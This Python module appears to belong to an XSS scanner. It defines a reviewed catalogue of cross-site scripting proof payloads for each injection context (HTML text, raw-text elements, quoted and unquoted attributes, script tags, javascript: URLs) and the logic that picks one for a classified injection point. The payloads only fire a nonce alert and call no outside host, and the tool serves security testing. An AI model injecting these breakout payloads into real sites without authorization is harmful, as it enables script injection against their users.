"""A small, reviewed payload catalogue -- one tactic per injection context.

Every payload here does exactly one visible thing: fire a dialog containing the
attempt nonce. None reads cookies, storage, or the DOM; none contacts another
host; none persists anything. The nonce is alphanumeric, so it survives HTML,
JavaScript, and URL quoting without needing an escape.

The browser is the arbiter. A payload that the target's encoding, filtering, or
syntax defeats produces a held result, never a finding. Payload selection is
therefore only a hypothesis about where the marker landed.
"""

from __future__ import annotations

from dataclasses import dataclass

from .classify import InjectionPoint
from .ids import new_nonce

NONCE_SLOT = "{nonce}"

# The proof element. ``src=x`` resolves to an in-scope path on the same host and
# fails to decode as an image, so ``onerror`` runs. It creates no visible
# content and sends no data anywhere.
PROOF_IMAGE = "<img src=x onerror=alert('{nonce}')>"

# URL-bearing attributes where a ``javascript:`` URL can be activated by a
# click. Resource attributes (src, data, poster, ...) do not execute a
# ``javascript:`` value, so they use an attribute breakout instead.
CLICKABLE_URL_ATTRIBUTES = frozenset({"href", "action", "formaction"})


@dataclass(frozen=True)
class Payload:
    """One reviewed template, tagged with the context it is written for."""

    family: str
    context: str
    sub_context: str
    template: str
    requires_interaction: bool = False
    signal: str = "dialog"
    quote: str | None = None
    why: str = ""


@dataclass(frozen=True)
class PayloadAttempt:
    """A rendered payload plus the facts the verifier and finding need."""

    family: str
    context: str
    sub_context: str
    payload: str
    nonce: str
    signal: str
    requires_interaction: bool
    why: str


# --- HTML body -------------------------------------------------------------
# A text node accepts a new element. The browser fetches /x, fails, and runs
# onerror. This is the plainest proof that markup reached the parser.
HTML_TEXT = Payload(
    family="html_text",
    context="html_body",
    sub_context="html_text",
    template=PROOF_IMAGE,
    why="A text node accepts a new element; onerror fires without interaction.",
)

# RCDATA and raw-text elements need to be closed before an element can exist.
HTML_TEXTAREA = Payload(
    family="html_textarea",
    context="html_body",
    sub_context="html_textarea",
    template="</textarea>" + PROOF_IMAGE,
    why="Close the textarea first; its raw text cannot contain a new element.",
)
HTML_TITLE = Payload(
    family="html_title",
    context="html_body",
    sub_context="html_title",
    template="</title>" + PROOF_IMAGE,
    why="Close the title first; title content is raw text, not markup.",
)
HTML_STYLE = Payload(
    family="html_style",
    context="html_body",
    sub_context="html_style",
    template="</style>" + PROOF_IMAGE,
    why="Close the style element first; CSS text cannot open an element.",
)

# --- Attributes ------------------------------------------------------------
# Break out of the current value and tag, then open the proof element. Matching
# the quote matters: the wrong quote stays inside the value and never fires.
ATTRIBUTE_DOUBLE = Payload(
    family="attribute_double",
    context="attribute",
    sub_context="quoted_double",
    template='">' + PROOF_IMAGE,
    quote='"',
    why="Close the double-quoted value and the tag, then add an element.",
)
ATTRIBUTE_SINGLE = Payload(
    family="attribute_single",
    context="attribute",
    sub_context="quoted_single",
    template="'>" + PROOF_IMAGE,
    quote="'",
    why="Close the single-quoted value and the tag, then add an element.",
)
ATTRIBUTE_UNQUOTED = Payload(
    family="attribute_unquoted",
    context="attribute",
    sub_context="unquoted",
    template="x>" + PROOF_IMAGE,
    quote=None,
    why="End the unquoted value and the tag, then add an element.",
)

# ``on*`` handlers are executable only when their event fires. Closing the
# attribute and tag and adding an auto-firing element proves the same sink
# without needing a synthetic click.
EVENT_DOUBLE = Payload(
    family="attribute_event",
    context="attribute",
    sub_context="event_handler",
    template='">' + PROOF_IMAGE,
    quote='"',
    why="Leave the handler and tag, then add an element that fires on load.",
)
EVENT_SINGLE = Payload(
    family="attribute_event",
    context="attribute",
    sub_context="event_handler",
    template="'>" + PROOF_IMAGE,
    quote="'",
    why="Leave the handler and tag, then add an element that fires on load.",
)
EVENT_UNQUOTED = Payload(
    family="attribute_event",
    context="attribute",
    sub_context="event_handler",
    template="x>" + PROOF_IMAGE,
    quote=None,
    why="End the unquoted handler and tag, then add an element that fires on load.",
)

# --- Script CDATA ----------------------------------------------------------
# The HTML tokenizer ends a script element at the first literal ``</script>``,
# regardless of the JavaScript string, template, comment, or JSON state around
# it. One breakout therefore covers every script sub-context.
SCRIPT_BREAKOUT = Payload(
    family="script_breakout",
    context="script",
    sub_context="script",
    template="</script>" + PROOF_IMAGE,
    why="End the script element, then add an element that fires on load.",
)

# --- URL-bearing attributes ------------------------------------------------
# A javascript: URL in a clickable attribute runs when the element is
# activated. It is context-specific and marked as needing a click.
URL_JAVASCRIPT = Payload(
    family="url_javascript",
    context="url",
    sub_context="url",
    template="javascript:alert('{nonce}')",
    requires_interaction=True,
    why="A javascript: URL in a clickable attribute runs when the element is clicked.",
)
URL_DOUBLE = Payload(
    family="url_breakout",
    context="url",
    sub_context="url",
    template='">' + PROOF_IMAGE,
    quote='"',
    why="Resource URLs do not run javascript:; close the attribute and tag instead.",
)
URL_SINGLE = Payload(
    family="url_breakout",
    context="url",
    sub_context="url",
    template="'>" + PROOF_IMAGE,
    quote="'",
    why="Resource URLs do not run javascript:; close the attribute and tag instead.",
)
URL_UNQUOTED = Payload(
    family="url_breakout",
    context="url",
    sub_context="url",
    template="x>" + PROOF_IMAGE,
    quote=None,
    why="Resource URLs do not run javascript:; end the value and tag instead.",
)


PAYLOADS: tuple[Payload, ...] = (
    HTML_TEXT,
    HTML_TEXTAREA,
    HTML_TITLE,
    HTML_STYLE,
    ATTRIBUTE_DOUBLE,
    ATTRIBUTE_SINGLE,
    ATTRIBUTE_UNQUOTED,
    EVENT_DOUBLE,
    EVENT_SINGLE,
    EVENT_UNQUOTED,
    SCRIPT_BREAKOUT,
    URL_JAVASCRIPT,
    URL_DOUBLE,
    URL_SINGLE,
    URL_UNQUOTED,
)

_EXACT: dict[tuple[str, str], Payload] = {
    (payload.context, payload.sub_context): payload
    for payload in PAYLOADS
    if payload.context in {"html_body", "attribute"} and payload.family not in {
        "attribute_event",
    }
}
_EVENT_BY_QUOTE: dict[str | None, Payload] = {
    EVENT_DOUBLE.quote: EVENT_DOUBLE,
    EVENT_SINGLE.quote: EVENT_SINGLE,
    EVENT_UNQUOTED.quote: EVENT_UNQUOTED,
}
_URL_BY_QUOTE: dict[str | None, Payload] = {
    URL_DOUBLE.quote: URL_DOUBLE,
    URL_SINGLE.quote: URL_SINGLE,
    URL_UNQUOTED.quote: URL_UNQUOTED,
}


def _choose(point: InjectionPoint) -> Payload | None:
    if point.context == "script":
        return SCRIPT_BREAKOUT
    if point.context == "url":
        if point.attribute in CLICKABLE_URL_ATTRIBUTES and point.quote in {'"', "'"}:
            return URL_JAVASCRIPT
        return _URL_BY_QUOTE.get(point.quote)
    if point.context == "attribute":
        if point.sub_context == "event_handler":
            return _EVENT_BY_QUOTE.get(point.quote)
        return _EXACT.get((point.context, point.sub_context))
    return _EXACT.get((point.context, point.sub_context))


def _render(payload: Payload, point: InjectionPoint | None, nonce: str) -> PayloadAttempt:
    return PayloadAttempt(
        family=payload.family,
        context=payload.context,
        sub_context=point.sub_context if point is not None else payload.sub_context,
        payload=payload.template.replace(NONCE_SLOT, nonce),
        nonce=nonce,
        signal=payload.signal,
        requires_interaction=payload.requires_interaction,
        why=payload.why,
    )


def select(point: InjectionPoint, nonce: str | None = None) -> PayloadAttempt | None:
    """Choose and render one payload for a classified point.

    ``None`` means the context has no reviewed payload (a comment, a tag name,
    or an unclassified parse). The caller must report that as held, never as a
    finding.
    """
    payload = _choose(point)
    if payload is None:
        return None
    return _render(payload, point, nonce or new_nonce())


def select_override(context: str, nonce: str | None = None) -> PayloadAttempt:
    """Render the primary payload for a reviewer-forced context.

    The override is a hypothesis supplied by the caller, not a classification.
    The browser still decides whether it executes.
    """
    primary = {
        "html_body": HTML_TEXT,
        "attribute": ATTRIBUTE_DOUBLE,
        "script": SCRIPT_BREAKOUT,
        "url": URL_JAVASCRIPT,
    }[context]
    attempt = _render(primary, None, nonce or new_nonce())
    return PayloadAttempt(
        family=attempt.family,
        context=attempt.context,
        sub_context="reviewer_override",
        payload=attempt.payload,
        nonce=attempt.nonce,
        signal=attempt.signal,
        requires_interaction=attempt.requires_interaction,
        why=attempt.why,
    )
